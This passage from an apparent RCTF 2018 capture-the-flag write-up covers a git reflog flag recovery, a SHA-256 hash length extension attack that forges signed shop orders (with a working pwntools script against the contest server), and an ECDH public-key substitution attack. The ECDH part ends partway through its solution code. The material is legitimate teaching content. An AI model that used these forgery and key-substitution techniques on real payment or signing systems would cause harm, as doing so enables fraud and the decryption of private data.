</span></span><span class=line><span class=cl>                        <span class=n>w1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>s</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                        <span class=c1>//for (int t = 0; t &lt;= strlen(printable); t++) {
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=c1>//    w1[5] = printable[t];
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=c1>// for (int u = 0; u &lt;= strlen(printable); u++) {
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=c1>//     w1[6] = printable[u];
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>auto</span> <span class=n>z</span> <span class=o>=</span> <span class=n>rhash</span><span class=p>(</span><span class=n>w1</span><span class=p>,</span> <span class=mi>13340610174042144018ull</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span> <span class=o>!=</span> <span class=n>m</span><span class=p>.</span><span class=n>end</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                                    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;part 2 &#34;</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>second</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>rev</span><span class=p>(</span><span class=n>w1</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=n>z</span> <span class=o>=</span> <span class=n>rhash</span><span class=p>(</span><span class=n>w1</span><span class=p>,</span> <span class=mi>95741437967718225ull</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span> <span class=o>!=</span> <span class=n>m</span><span class=p>.</span><span class=n>end</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                                    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;part 3 &#34;</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>second</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>rev</span><span class=p>(</span><span class=n>w1</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=n>z</span> <span class=o>=</span> <span class=n>rhash</span><span class=p>(</span><span class=n>w1</span><span class=p>,</span> <span class=mi>484886919005526ull</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span> <span class=o>!=</span> <span class=n>m</span><span class=p>.</span><span class=n>end</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                                    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;part 4 &#34;</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>second</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>rev</span><span class=p>(</span><span class=n>w1</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=c1>// }
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=c1>//}
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 class="relative group">Git<div id=git class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#git aria-label=Anchor>#</a></span></h2><p><a href="https://drive.google.com/open?id=1Mo3uN2FV1J-lbqjQZvvXitWagZqjD1Xi" target=_blank>Attachment (original link)</a></p><p>We are given a git repository</p><p>Let&rsquo;s explore the logs</p><pre tabindex=0><code>chqma@computer:~/ctf/rctf/git$ git log
commit 22d3349a5c6fe45758daba276108137382a01caa (HEAD -&gt; master, develop)
Author: zsx &lt;zsx@zsxsoft.com&gt;
Date:   Sun May 13 12:54:34 2018 +0800

    Initial Commit
</code></pre><p>Nothing interesting&mldr;</p><p>Check .git</p><pre tabindex=0><code>chqma@computer:~/ctf/rctf/git$ ls -lar
total 16
-rw-r--r-- 1 chqma chqma   11 mag 13 06:54 HelloWorld.txt
drwxr-xr-x 8 chqma chqma 4096 mag 19 08:18 .git
drwxr-xr-x 3 chqma chqma 4096 mag 19 08:18 ..
drwxr-xr-x 3 chqma chqma 4096 mag 13 06:55 .
chqma@computer:~/ctf/rctf/git$ ls .git/
branches        config       HEAD   index  logs     ORIG_HEAD
COMMIT_EDITMSG  description  hooks  info   objects  refs
</code></pre><p>Ok COMMIT_EDITMSG and description look suspicious, let&rsquo;s check them out</p><pre tabindex=0><code>chqma@computer:~/ctf/rctf/git$ cd .git
chqma@computer:~/ctf/rctf/git/.git$ cat description 
Unnamed repository; edit this file &#39;description&#39; to name the repository.
chqma@computer:~/ctf/rctf/git/.git$ cat COMMIT_EDITMSG 
Revert
# ËØ∑‰∏∫ÊÇ®ÁöÑÂèòÊõ¥ËæìÂÖ•Êèê‰∫§ËØ¥Êòé„ÄÇ‰ª• &#39;#&#39; ÂºÄÂßãÁöÑË°åÂ∞ÜË¢´ÂøΩÁï•ÔºåËÄå‰∏Ä‰∏™Á©∫ÁöÑÊèê‰∫§
# ËØ¥ÊòéÂ∞Ü‰ºöÁªàÊ≠¢Êèê‰∫§„ÄÇ
#
# ‰Ωç‰∫éÂàÜÊîØ rctf
# Ë¶ÅÊèê‰∫§ÁöÑÂèòÊõ¥Ôºö
# Âà†Èô§Ôºö     flag.txt
#
</code></pre><p>So the flag was commited by &ldquo;mistake&rdquo;, let&rsquo;s find the commit hash with git reflog</p><pre tabindex=0><code>chqma@computer:~/ctf/rctf/git/.git$ git reflog
22d3349 (HEAD -&gt; master, develop) HEAD@{0}: checkout: moving from develop to master
22d3349 (HEAD -&gt; master, develop) HEAD@{1}: rebase -i (finish): returning to refs/heads/develop
22d3349 (HEAD -&gt; master, develop) HEAD@{2}: rebase -i (start): checkout 22d3349
f671986 HEAD@{3}: checkout: moving from master to develop
22d3349 (HEAD -&gt; master, develop) HEAD@{4}: checkout: moving from develop to master
f671986 HEAD@{5}: checkout: moving from master to develop
22d3349 (HEAD -&gt; master, develop) HEAD@{6}: checkout: moving from rctf to master
f671986 HEAD@{7}: commit: Revert
f4d0f6d HEAD@{8}: commit: Flag
22d3349 (HEAD -&gt; master, develop) HEAD@{9}: checkout: moving from master to rctf
22d3349 (HEAD -&gt; master, develop) HEAD@{10}: commit (initial): Initial Commit
</code></pre><p>Now just check out the right commit and we are done</p><pre tabindex=0><code>chqma@computer:~/ctf/rctf/git/.git$ cd ..
chqma@computer:~/ctf/rctf/git$ git checkout f4d0f6d
Note: checking out &#39;f4d0f6d&#39;.

You are in &#39;detached HEAD&#39; state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b &lt;new-branch-name&gt;

HEAD is now at f4d0f6d... Flag
chqma@computer:~/ctf/rctf/git$ ls
flag.txt  HelloWorld.txt
chqma@computer:~/ctf/rctf/git$ cat flag.txt 
RCTF{gIt_BranCh_aNd_l0g}
</code></pre><h2 class="relative group">CPUSHOP<div id=cpushop class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#cpushop aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview aria-label=Anchor>#</a></span></h3><p>We are given a python source code for the app</p><p>it generates a signkey</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>signkey</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>letters</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>xrange</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=mi>32</span><span class=p>))])</span>
</span></span></code></pre></div><p>We can choose among many cpus with different price tag or the flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>items</span> <span class=o>=</span> <span class=p>[(</span><span class=s1>&#39;Intel Core i9-7900X&#39;</span><span class=p>,</span> <span class=mi>999</span><span class=p>),</span> <span class=o>...</span> <span class=p>,(</span><span class=s1>&#39;Flag&#39;</span><span class=p>,</span> <span class=mi>99999</span><span class=p>)]</span>
</span></span></code></pre></div><p>However we don&rsquo;t have enough money for the flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>money</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span> <span class=mi>10000</span><span class=p>)</span>
</span></span></code></pre></div><p>If we order a product we are given a signed order like this one</p><p><code>product=Intel Core i9-7900X&amp;price=999&amp;timestamp=1526709982568192&amp;sign=d37055b05664f5563062aa45510ad8d779d8cb2c103bdf2791dfd5ef6c44927d</code></p><p>In the pay function it checks that the signature of the order is correct</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>sp</span> <span class=o>=</span> <span class=n>payment</span><span class=o>.</span><span class=n>rfind</span><span class=p>(</span><span class=s1>&#39;&amp;sign=&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sp</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;Invalid Order!&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>sign</span> <span class=o>=</span> <span class=n>payment</span><span class=p>[</span><span class=n>sp</span><span class=o>+</span><span class=mi>6</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sign</span> <span class=o>=</span> <span class=n>sign</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>TypeError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;Invalid Order!&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payment</span> <span class=o>=</span> <span class=n>payment</span><span class=p>[:</span><span class=n>sp</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signchk</span> <span class=o>=</span> <span class=n>sha256</span><span class=p>(</span><span class=n>signkey</span><span class=o>+</span><span class=n>payment</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>repr</span><span class=p>(</span><span class=n>payment</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>signchk</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;hex&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>signkey</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>signchk</span> <span class=o>!=</span> <span class=n>sign</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;Invalid sign!&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span></code></pre></div><p>If we set product to Flag and we have enough money the server will send us the flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span><span class=n>v</span> <span class=ow>in</span> <span class=n>parse_qsl</span><span class=p>(</span><span class=n>payment</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=s1>&#39;product&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>product</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>k</span> <span class=o>==</span> <span class=s1>&#39;price&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>price</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span> <span class=s1>&#39;Invalid Order!&#39;</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>money</span> <span class=o>&lt;</span> <span class=n>price</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;Go away you poor bastard!&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span></code></pre></div><h3 class="relative group">Signature<div id=signature class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#signature aria-label=Anchor>#</a></span></h3><p>The signature algorithm is simple</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payment</span> <span class=o>=</span> <span class=s1>&#39;product=</span><span class=si>%s</span><span class=s1>&amp;price=</span><span class=si>%d</span><span class=s1>&amp;timestamp=</span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>items</span><span class=p>[</span><span class=n>n</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span> <span class=n>items</span><span class=p>[</span><span class=n>n</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>*</span><span class=mi>1000000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sign</span> <span class=o>=</span> <span class=n>sha256</span><span class=p>(</span><span class=n>signkey</span><span class=o>+</span><span class=n>payment</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span></code></pre></div><p>It uses sha256 and the secret is at the beginning, so it is vulnerable to a hash extension attack.</p><p>There are many tools for hash extension, we chose <a href=https://github.com/iagox86/hash_extender target=_blank>https://github.com/iagox86/hash_extender</a> because it is kind of reliable.</p><h3 class="relative group">Pay<div id=pay class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#pay aria-label=Anchor>#</a></span></h3><p>The pay function doesn&rsquo;t check for:</p><ol><li>repeated keys</li><li>the order of the keys.</li><li>if the keys are valid</li></ol><p>It will always keep the latest value.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>k</span><span class=p>,</span><span class=n>v</span> <span class=ow>in</span> <span class=n>parse_qsl</span><span class=p>(</span><span class=n>payment</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=s1>&#39;product&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>product</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>k</span> <span class=o>==</span> <span class=s1>&#39;price&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>price</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span> <span class=s1>&#39;Invalid Order!&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span></code></pre></div><h3 class="relative group">Idea<div id=idea class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#idea aria-label=Anchor>#</a></span></h3><ol><li>Append &amp;product=Flag to a cheap product</li><li>Append &amp;price=1 to a Flag order</li></ol><p>We choose the first route because it seems more reliable</p><h3 class="relative group">Solving<div id=solving class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solving aria-label=Anchor>#</a></span></h3><p>The last challenge is the length of the secret which is randomized at the start.</p><p>We just loop through every possible length</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>pwn</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;cpushop.2018.teamrois.cn&#39;</span><span class=p>,</span> <span class=mi>43000</span><span class=p>)</span> <span class=k>as</span> <span class=n>r</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=c1># with pwn.process([&#39;python&#39;, &#39;cpushop.py&#39;]) as r:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=mi>33</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Command&#39;</span><span class=p>)</span>            
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Product ID&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your order:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>### get order and signature</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span><span class=p>,</span> <span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&amp;sign&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>### get hash extended string</span>
</span></span><span class=line><span class=cl>        <span class=n>l</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>([</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;/home/chqma/ctf/hash_extender/hash_extender&#39;</span><span class=p>,</span> <span class=s1>&#39;-d&#39;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=s1>&#39;-s&#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=s1>&#39;-a&#39;</span><span class=p>,</span> <span class=s1>&#39;&amp;product=Flag&#39;</span><span class=p>,</span> <span class=s1>&#39;-f&#39;</span><span class=p>,</span> <span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=s1>&#39;-l&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=s1>&#39;--out-data-format&#39;</span><span class=p>,</span> <span class=s1>&#39;raw&#39;</span>
</span></span><span class=line><span class=cl>        <span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>head</span> <span class=o>=</span> <span class=s1>&#39;New signature: &#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>l</span><span class=p>[</span><span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>head</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>head</span><span class=p>):</span><span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>head</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=n>l</span><span class=p>[</span><span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;New string: &#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;New string: &#39;</span><span class=p>):</span><span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>l</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;New string: &#39;</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Command&#39;</span><span class=p>)</span>        
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1>&amp;sign=</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>d</span><span class=p>,</span> <span class=n>s</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=c1>### profit</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">ECDH<div id=ecdh class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ecdh aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-1 aria-label=Anchor>#</a></span></h3><p>A crypto challenge</p><p>ECDH -> elliptic curve diffie hellman <a href=https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman target=_blank>ECDH</a></p><p>We can iteract with Alice and Bob</p><p>Choosing <code>about</code> will tell us the curve parameters and the symmetric key algorithm that will use the shared secret from the exchange</p><pre tabindex=0><code>chqma@computer:~$ nc ECDH.2018.teamrois.cn 42000

Welcome to my GETFLAG system
1. visit Alice
2. visit Bob
3. about
input here: 3
ECDH.....https://github.com/esxgx/easy-ecc..secp128r1..AES...EBC.......
</code></pre><p>We can ask Alice for the public keys, but also set Bob&rsquo;s public key</p><pre tabindex=0><code>Hello nobody...I&#39;m Alice... you can:
1. ask for flag
2. ask me about my public key
3. ask me about Bob&#39;s public key
4. tell me Bob&#39;s public key
</code></pre><p>We can do the same with Bob</p><pre tabindex=0><code>Hello nobody...I&#39;m Bob... you can:
1. ask for flag
2. ask me about my public key
3. ask me about Alice&#39;s public key
4. tell me Alice&#39;s public key
</code></pre><p>If we ask Bob for the flag he will use ECDH to share an AES key with Alice and then send an encrypted flag to Alice</p><h3 class="relative group">Protocol<div id=protocol class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#protocol aria-label=Anchor>#</a></span></h3><p>In ECDH the shared secret <code>x</code> is the x coordinate of the point <code>dA*dB*G</code> where <code>dA</code> and <code>dB</code> are numbers (the private secret of Alice and Bob) and <code>G</code> is a fixed generator point of the curve.</p><p>It is computed combining Alice&rsquo;s private key with Bob public key and vice versa.</p><p>Bob and Alice public keys are <code>dB*G</code> and <code>dA*G</code>.</p><p>Since Bob is encrypting the message, his computed secret will be <code>dB * PublicAlice</code>, that is <code>dB * dA * G</code> if we don&rsquo;t change Alice&rsquo;s public key.</p><h4 class="relative group">Main idea<div id=main-idea class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#main-idea aria-label=Anchor>#</a></span></h4><p>We notice that if we set Alice&rsquo;s public key to something we know like <code>2 * G</code>, Bob&rsquo;s shared key will be <code>db * 2 * G</code>, that is <code>PublicBob * 2</code>.</p><p>The shared key will depend only on public data.</p><p>We congecture that</p><ul><li>aes128 is used since the curve is 128bit</li><li>there is no key derivation function</li></ul><h3 class="relative group">Solution<div id=solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution aria-label=Anchor>#</a></span></h3><ol start=0><li>Get curve parameters</li><li>Get Bob public key</li><li>Set Alice public key to <code>2*G</code></li><li>Ask Bob for flag (msg)</li><li>Get encrypted flag from Alice</li><li>Fire up SageMath</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=c1># setup</span>
</span></span><span class=line><span class=cl><span class=n>F</span> <span class=o>=</span> <span class=n>GF</span><span class=p>(</span><span class=mh>0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mh>0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=mh>0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFC</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=mh>0xE87579C11079F43DD824993C2CEE5ED3</span>
